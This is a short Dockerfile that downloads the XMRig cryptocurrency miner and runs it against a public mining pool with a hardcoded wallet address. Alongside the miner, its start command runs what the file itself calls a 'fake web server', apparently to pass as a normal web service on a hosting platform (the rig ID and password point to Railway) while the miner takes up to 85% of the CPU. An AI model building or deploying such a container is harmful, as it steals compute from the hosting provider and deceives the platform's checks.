FROM alpine:3.20

# Install wget, tar, and busybox-extras for http server
RUN apk add --no-cache wget tar busybox-extras

# Download XMRig
RUN wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz \
    && tar -xzf xmrig-6.21.0-linux-static-x64.tar.gz \
    && mv xmrig-6.21.0/xmrig /usr/local/bin/xmrig \
    && rm -rf xmrig-6.21.0 xmrig.tar.gz

# Start fake web server + miner
CMD sh -c "\
  echo 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nMining active on pool.hashvault.pro:443' | busybox httpd -f -p $PORT & \
  xmrig \
    -o pool.hashvault.pro:443 \
    --tls \
    -u 41npxEnqoL4SJf3FPxySonMjLo4dAXe64QtX5a2Ygd9SMRHuvVuBjGNMhD7fSq2BhqcAZiAdF1uCCasz2vnxtSyjKvNmr2x \
    -p railway \
    --rig-id railway-$(shuf -i 1000-9999 -n 1) \
    --donate-level=1 \
    --max-cpu-usage=85 \
    --cpu-priority=2 \
    --randomx-1gb-pages \
    --no-color \
    --print-time=60"
